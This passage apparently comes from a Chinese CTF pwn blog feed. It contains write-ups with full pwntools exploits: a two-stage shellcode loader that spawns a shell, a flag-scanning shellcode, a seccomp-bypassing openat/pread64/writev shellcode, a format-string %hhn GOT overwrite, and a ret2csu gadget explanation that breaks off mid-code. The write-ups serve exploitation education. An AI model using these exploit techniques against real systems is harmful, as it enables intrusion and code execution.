class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br>p.recvuntil(<span class="hljs-string">b&quot;compile)\n&quot;</span>)<br><br>stage1 = (<br>    <span class="hljs-string">b&quot;\x48\x8d\x35\x20\x00\x00\x00&quot;</span>  <span class="hljs-comment"># lea rsi, [rip+0x20]</span><br>    <span class="hljs-string">b&quot;\xb2\xff&quot;</span>                      <span class="hljs-comment"># mov dl, 0xff  只写2字节，极限</span><br>    <span class="hljs-string">b&quot;\x0f\x05&quot;</span>                      <span class="hljs-comment"># syscall</span><br>    <span class="hljs-string">b&quot;\xff\xe6&quot;</span>                      <span class="hljs-comment"># jmp rsi</span><br>)<br><br>p.send(stage1)<br><br>time.sleep(<span class="hljs-number">0.05</span>)  <span class="hljs-comment"># 留一点时间读取shellcode</span><br><br>stage2 = asm(shellcraft.sh())<br>p.send(stage2.ljust(<span class="hljs-number">0xff</span>, <span class="hljs-string">b&quot;\x90&quot;</span>))  <span class="hljs-comment"># nop填满buf，避免rubbish</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>拿下!</p><p>接下来看第二题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">char</span> *__s;<br>  <span class="hljs-type">size_t</span> sVar2;<br>  <span class="hljs-type">size_t</span> __n;<br>  <span class="hljs-type">long</span> lVar3;<br>  undefined8 *puVar4;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  byte bVar5;<br>  undefined8 local_218;<br>  undefined8 local_210;<br>  undefined8 local_208 [<span class="hljs-number">63</span>];<br>  undefined8 local_10;<br>  <br>  bVar5 = <span class="hljs-number">0</span>;<br>  local_10 = *(undefined8 *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>); <span class="hljs-meta"># canary</span><br>  init(param_1);   #初始化函数<br>  local_218 = <span class="hljs-number">0</span>;<br>  local_210 = <span class="hljs-number">0</span>;<br>  puVar4 = local_208;<br>  <span class="hljs-keyword">for</span> (lVar3 = <span class="hljs-number">0x3e</span>; lVar3 != <span class="hljs-number">0</span>; lVar3 = lVar3 + <span class="hljs-number">-1</span>) &#123;<br>    *puVar4 = <span class="hljs-number">0</span>;<br>    puVar4 = puVar4 + (ulong)bVar5 * <span class="hljs-number">-2</span> + <span class="hljs-number">1</span>;<br>  &#125;<br>  *(undefined1 *)puVar4 = <span class="hljs-number">0</span>;<br>  __s = (<span class="hljs-type">char</span> *)read_flag(<span class="hljs-string">&quot;/flag&quot;</span>);  #关键<br>  sVar2 = <span class="hljs-built_in">strlen</span>(__s);<br>  __s[sVar2] = <span class="hljs-string">&#x27;H&#x27;</span>;<br>  __s[sVar2 + <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;1&#x27;</span>;<br>  __s[sVar2 + <span class="hljs-number">2</span>] = <span class="hljs-number">-0x40</span>;   <span class="hljs-meta">#xor rax,rax</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I forgot the flag.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Can you find it?&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &gt; &quot;</span>);<br>  __n = read(<span class="hljs-number">0</span>,&amp;local_218,<span class="hljs-number">0x200</span>);<br>  <span class="hljs-keyword">if</span> (__n == <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;read&quot;</span>);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">memcpy</span>(__s + sVar2 + <span class="hljs-number">3</span>,&amp;local_218,__n);<br>  iVar1 = mprotect(__s,<span class="hljs-number">0x1000</span>,<span class="hljs-number">5</span>);   #可执行<br>  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">-1</span>) &#123;<br>    perror(<span class="hljs-string">&quot;mprotect&quot;</span>);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  install_seccomp();<br>                    <span class="hljs-comment">/* WARNING: Could not recover jumptable at 0x0010169d. Too many branches */</span><br>                    <span class="hljs-comment">/* WARNING: Treating indirect jump as call */</span><br>  (*(code *)(__s + sVar2))(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);  #执行<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>read_flag函数为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> * <span class="hljs-title function_">read_flag</span><span class="hljs-params">(<span class="hljs-type">char</span> *param_1)</span><br>&#123;<br>  <span class="hljs-type">int</span> __fd;<br>  <span class="hljs-type">void</span> *pvVar1;<br>  <br>  __fd = open(param_1,<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (__fd &lt; <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;Can\&#x27;t open flag file: &quot;</span>);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  pvVar1 = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,__fd,<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (pvVar1 == (<span class="hljs-type">void</span> *)<span class="hljs-number">0xffffffffffffffff</span>) &#123;<br>    perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  close(__fd);<br>  <span class="hljs-keyword">return</span> pvVar1;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目逻辑非常清晰，也很贴心，程序先把flag文件的内容直接读到内存里，然后在flag结尾拼接你输入的数据(我们写的shellcode)，再把这整块内存改成RX(可执行)，最后从flag末尾开始当函数执行你的shellcode，所以解法也是很简单，直接在mmap空间搜索<code>flag{}</code>字符串即可</p><p>这里涉及到如何编写汇编</p><p>我先直接放一下我写的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>io = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>shellcode = asm(<span class="hljs-string">r&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    lea rbx, [rip]  #加载地址</span><br><span class="hljs-string"></span><br><span class="hljs-string">find_flag:</span><br><span class="hljs-string">    dec rbx          # rbx=rbx-1 循环</span><br><span class="hljs-string">    cmp dword ptr [rbx], 0x67616c66   # flag字符串</span><br><span class="hljs-string">    jne find_flag    #条件跳转,不是flag继续往前找,注意byte dword qword区别 </span><br><span class="hljs-string">    cmp byte ptr [rbx+4], 0x7b        #&#123; 二次验证</span><br><span class="hljs-string">    jne find_flag</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rsi, rbx      #到这里已经找到了，先将rsi设置为flag的起始地址</span><br><span class="hljs-string">    xor rdx, rdx      #len先设置为0，读取flag直到&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">len_scan:</span><br><span class="hljs-string">    cmp byte ptr [rsi + rdx], 0x7d   #&#125;</span><br><span class="hljs-string">    je write_flag</span><br><span class="hljs-string">    inc rdx             #rdx=rdx+1</span><br><span class="hljs-string">    jmp len_scan</span><br><span class="hljs-string"></span><br><span class="hljs-string">write_flag:</span><br><span class="hljs-string">    inc rdx          #加上&#125;</span><br><span class="hljs-string">    mov rdi, 1        #stdout</span><br><span class="hljs-string">    mov rax, 1         #write系统调用号</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 60       #exit</span><br><span class="hljs-string">    xor rdi, rdi      #rdi=0</span><br><span class="hljs-string">    syscall         #安全退出程序</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br>io.send(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>直接看注释吧，应该蛮好理解的…</p><p>接下来看第三题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  code *__buf;<br>  <br>  init(param_1);<br>  __buf = (code *)mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x114514</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input a orw_plus function (also also after compile)&quot;</span>);<br>  read(<span class="hljs-number">0</span>,__buf,<span class="hljs-number">0x500</span>);<br>  install_seccomp();<br>  (*__buf)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目逻辑和第一题一模一样，不同之处在于开启了seccomp，发现其禁用了execve,open,read,write,sendfile,没招了吗,不,其实还有很多的类似功能的<code>orw</code>供聪明的我们使用，这里我用的是<code>openat</code>,<code>pread64</code>和<code>writev</code></p><p>直接看exp吧…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rdi, -100     # openat(-100,flag,0,0)  系统调用号 257   在栈上动态构造shellcode  寄存器rdi rsi rdx r10 r8 r9 ...</span><br><span class="hljs-string">    push 0x67616c66   # flag </span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    xor r10, r10</span><br><span class="hljs-string">    push 257</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    push rax    # pread64(fd,buf,0x100,0)  系统调用号 17  将rax传给rdi作为fd</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    sub rsp, 0x100   #分配足够的栈空间来读取flag</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    push 0x100</span><br><span class="hljs-string">    pop rdx</span><br><span class="hljs-string">    xor r10, r10</span><br><span class="hljs-string">    push 17</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    push 1    # writev(1,struct iovec,1)  系统调用号 20  struct iovec len + base*</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    push 0x100</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    push 1</span><br><span class="hljs-string">    pop rdx</span><br><span class="hljs-string">    push 20</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;)&#x27;</span>)<br><br>p.send(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>这里解释一下iovec结构体(分散-聚集I&#x2F;O)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/uio.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> &#123;</span><br>    <span class="hljs-type">void</span>  *iov_base;  <span class="hljs-comment">// 缓冲区起始地址（用户空间内存）</span><br>    <span class="hljs-type">size_t</span> iov_len;   <span class="hljs-comment">// 缓冲区长度（字节数）</span><br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rsi, rsp<br>push 0x100<br>push rsi<br>mov rsi, rsp<br></code></pre></td></tr></table></figure><p>这里把rsp保存至rsi，先<code>push 0x100</code>(len)至栈上，再<code>push rsi</code>(flag起始地址)至栈上，这便形成了一个<code>struct iovec</code>，再把rsp(iov_base指针)传给rdi即可</p><p>同时,总结一下栈结构</p><p>高地址</p><p>argc<br>argv[]<br>envp[]<br>auxv[]<br>…<br>返回地址<br>saved rbp<br>canary   maybe<br>局部变量<br>…   rsp<br>低地址</p><p>LIFO,push压栈<code>rsp -= 8</code>,pop出栈<code>rsp += 8</code>…</p><p>感谢阅读…</p><p>后面再补充吧…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄存器</tag>
      
      <tag>shellcode编写</tag>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fmt_got</title>
    <link href="/2025/12/30/fmt-got/"/>
    <url>/2025/12/30/fmt-got/</url>
    
    <content type="html"><![CDATA[<p>你好，又见面了…</p><p>算了今天不废话了，直接看题目吧</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_118 [<span class="hljs-number">264</span>];<br>  undefined8 local_10;<br>  <br>  local_10 = *(undefined8 *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  setup();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;tell me what you want to say:&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&gt; &quot;</span>);<br>  builtin_strncpy(local_118,<span class="hljs-string">&quot;That\&#x27;s what you want to say...    &quot;</span>,<span class="hljs-number">0x23</span>);<br>  read(<span class="hljs-number">0</span>,local_118 + <span class="hljs-number">0x22</span>,<span class="hljs-number">0x100</span>);<br>  <span class="hljs-built_in">printf</span>(local_118);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nthat\&#x27;s it? boring... bye&quot;</span>);<br>  FUN_00401140(<span class="hljs-number">1</span>);<br>  halt_baddata();<br>&#125;<br></code></pre></td></tr></table></figure><p>还悄悄藏了一个函数…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">read_flag</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  FILE *__stream;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_58 [<span class="hljs-number">72</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  __stream = fopen(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> (__stream == (FILE *)<span class="hljs-number">0x0</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;flag not found! Contact admin if you see this on the remote server.&quot;</span>);<br>    FUN_00401140(<span class="hljs-number">1</span>);<br>  &#125;<br>  fgets(local_58,<span class="hljs-number">0x40</span>,__stream);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;How you do that... here is the flag:  %s\n&quot;</span>,local_58);<br>  fclose(__stream);<br>  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;   <span class="hljs-meta">#ps:反正就是cat flag，写那么长我真没招了</span><br>&#125;<br></code></pre></td></tr></table></figure><p>保护为<code>NX</code>和<code>canary found</code>，但是不好意思，今天不打返回地址，注意到题目存在格式化字符串漏洞，同时保护为<code>partial RELRO</code>，因此<code>GOT</code>表可写，直接利用%n任意写覆盖exit的<code>GOT</code>表地址为<code>read_flag</code>即可</p><p>在此之前，你可能需要一些前置知识</p><p>1.什么是格式化字符串漏洞，本人词不达意，还请参考如下链接(直接点，放心)</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">fmt</a></p><p>2.什么是got表，什么是plt，动态链接器(ld,哈哈哈)和共享库是什么，程序第一次调用<code>puts</code>这个函数时到底发生了什么，想必经过ret2libc的洗礼，前两个问题的答案你已知晓，但是后两个问题将回到更底层的维度，等待着你去探索(我也在探索中…)，也许我后面会写一篇关于此和ret2dlresolve的文章，等我先沉淀沉淀吧…</p><p>OK，还是回到题目本身</p><p>先观察我们格式化字符的写入点</p><p><img src="/images/6.png" alt="qwq"></p><p>可以看到，我们的<code>AAAA</code>从第十个<code>%p</code>的第低三位个字节开始写起，我们的目标是将exit的got(0x403430)覆写为read_flag(0x401236)，采用<code>%hhn</code>逐字节写的方式</p><p>先将0x403430的最低字节0x30覆写为0x36(注意小端序地址表示法)，注意<code>builtin_strncpy(local_118,&quot;That\&#39;s what you want to say...    &quot;,0x23);</code>已经给了<code>local_118</code>34字节的长度，所以再补20个字节得到0x36(54)便可达到目的</p><p>然后将0x403431，即第低二位字节0x34覆写为0x12即可，注意此时<code>local_118</code>的长度已经是54，而目标是0x12(18)，因此先补202个字节至256(你懂的)，再补18个字节回到0x12，一共220个字节，便成功覆写了exit的<code>GOT</code>为<code>read_flag</code></p><p>先大致写出payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload  = <span class="hljs-string">b&#x27;%20x%?$hhn%220x%?$hhn&#x27;</span><br></code></pre></td></tr></table></figure><p>?即写入地址0x403430和0x403431的位置，我们推理一下，首先?必定为两位数，因此payload所占字节长度为<code>23</code>，而我们输入的字符从第十个<code>%p</code>的第低三位个字节开始写起，因此发送payload后先是6个字节写完了10，而后还有17个字节分别完了11，12，并写了13的1个字节，因此再补7个字节的长度填满13，最后输入要覆写的地址0x403430，0x403431即在14，15的位置，真是一场酣畅淋漓的构造啊…</p><p>当时的我只是傻傻地对着wp猜偏移，经过很长时间的分析(真的很长时间，没人问，纯自己瞎折腾 (╥﹏╥) )才终于理解了本质，现在写下来，希望能帮到困惑的你…</p><p>最后贴一下完整exp(真的很短，但是也真的很值得深思…)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>os = <span class="hljs-string">&quot;linux&quot;</span><br><span class="hljs-comment">#p = process(&#x27;./fmt_got&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">46677</span>)<br><br>payload  = <span class="hljs-string">b&#x27;%20x%14$hhn%220x%15$hhn&#x27;</span><br>payload += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span><br>payload += p64(<span class="hljs-number">0x403430</span>) + p64(<span class="hljs-number">0x403431</span>)<br><br>p.sendafter(<span class="hljs-string">b&#x27;\n&gt; &#x27;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>好了，又写一篇，感谢阅读，天天开心…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fmt</tag>
      
      <tag>ret2GOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2csu</title>
    <link href="/2025/12/25/ret2csu/"/>
    <url>/2025/12/25/ret2csu/</url>
    
    <content type="html"><![CDATA[<p>别急，还没写…</p><p>好了，现在写了…</p><p>额，还记得上次没有gadget的情况下我们采用了SROP，但是倘若没有syscall也没法控制rax呢，别急，还有一个办法，便是今天的<code>ret2csu</code></p><p>一般的elf文件在<code>libc_start_main</code>中会存在<code>libc_csu_init</code>对libc进行初始化，而恰好<code>libc_csu_init</code>中隐含着两个我们可以利用的gadget…</p><p>一般长这样，<code>gadget1</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">00400606  mov rbx, [rsp+0x8]<br>0040060b  mov rbp, [rsp+0x10]<br>00400610  mov r12, [rsp+0x18]<br>00400615  mov r13, [rsp+0x20]<br>0040061a  mov r14, [rsp+0x28]<br>0040061f  mov r15, [rsp+0x30]<br>00400624  add rsp, 0x38<br>00400628  ret<br></code></pre></td></tr></table></figure><p>也有可能是一串<code>pop</code>，不过本质是一样的</p><p><code>gadget2</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">004005f0 mov     rdx, r15<br>004005f3 mov     rsi, r14<br>004005f6 mov     edi, r13d<br>004005f9 call    qword ptr [r12+rbx*8]<br></code></pre></td></tr></table></figure><p>乍一看，这啥呀，实则我们却能因此控制关键的<code>rdi</code>,<code>rsi</code>和<code>rdx</code>并调用函数，太神秘了…</p><p>好吧，还是来看具体的题目吧</p><p>题目依旧忘记出自哪里了，私密马赛</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Hello, World\n&quot;</span>,<span class="hljs-number">0xd</span>);<br>  vulnerable_function();<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  undefined1 local_88 [<span class="hljs-number">128</span>];<br>  <br>  read(<span class="hljs-number">0</span>,local_88,<span class="hljs-number">0x200</span>);<br>  <span 